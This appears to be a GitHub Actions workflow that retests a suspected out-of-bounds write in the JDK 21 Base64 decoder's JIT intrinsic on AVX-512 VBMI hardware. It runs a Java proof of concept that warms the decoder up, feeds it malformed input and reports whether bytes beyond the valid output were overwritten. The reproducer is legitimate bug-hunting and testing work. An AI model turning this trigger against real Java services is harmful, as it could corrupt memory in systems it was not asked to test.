name: Retest with JIT diagnostics
on: [workflow_dispatch]

jobs:
  retest:
    runs-on: ubuntu-latest
    steps:
      - name: Setup JDK 21
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '21.0.13'

      - name: VBMI present
        run: |
          echo "avx512vbmi: $(grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' | grep -x avx512vbmi || echo ABSENT)"
          echo "avx512f: $(grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' | grep -x avx512f || echo ABSENT)"
          echo "avx512bw: $(grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' | grep -x avx512bw || echo ABSENT)"
          echo "bmi2: $(grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' | grep -x bmi2 || echo ABSENT)"
          java -version 2>&1

      - name: Bounded PoC with 500K warmup + JIT print
        run: |
          cat > PoC2.java <<'JAVA'
          import java.util.Arrays;
          import java.util.Base64;

          public class PoC2 {
              static volatile int sink;
              public static void main(String[] args) throws Exception {
                  System.out.println("java: " + System.getProperty("java.version"));
                  Base64.Decoder dec = Base64.getDecoder();
                  int n = 64;
                  byte[] valid = new byte[n];
                  for (int i = 0; i < n; i++) valid[i] = 65;
                  byte[] target = new byte[4096];

                  // Massive warmup: 500K iterations
                  System.out.println("warming (500K)...");
                  for (int i = 0; i < 500000; i++) {
                      sink += dec.decode(valid, target);
                  }
                  System.out.println("warmup done");

                  // Also try with shorter arrays (the lab target used byte[48] dst)
                  byte[] shortdst = new byte[48];
                  for (int i = 0; i < 500000; i++) {
                      sink += dec.decode(valid, shortdst);
                  }
                  System.out.println("short warmup done");

                  // Strike with malformed input
                  byte[] malformed = new byte[n + 1];
                  for (int i = 0; i < n; i++) malformed[i] = 65;
                  malformed[n] = 61;

                  // Test on BOTH target sizes
                  for (String size : new String[]{"4096", "48", "50"}) {
                      byte[] t = new byte[Integer.parseInt(size)];
                      for (int i = 0; i < t.length; i++) t[i] = (byte)0x5a;
                      boolean rejected = false;
                      try { dec.decode(malformed, t); }
                      catch (IllegalArgumentException e) { rejected = true; }
                      int v = 3 * n / 4 + 2;
                      int changed = 0, first = -1;
                      for (int i = v; i < t.length; i++) {
                          if (t[i] != (byte)0x5a) { changed++; if (first < 0) first = i; }
                      }
                      System.out.println("dst=" + size + ": rejected=" + rejected +
                          " changed=" + changed + " first=" + first);
                  }
                  System.out.println("DONE");
              }
          }
          JAVA
          javac PoC2.java
          echo "=== Run with C2-only, sync compile ==="
          java -XX:-TieredCompilation -XX:-BackgroundCompilation PoC2 2>&1
          echo ""
          echo "=== Run with default flags (tiered) ==="
          java PoC2 2>&1
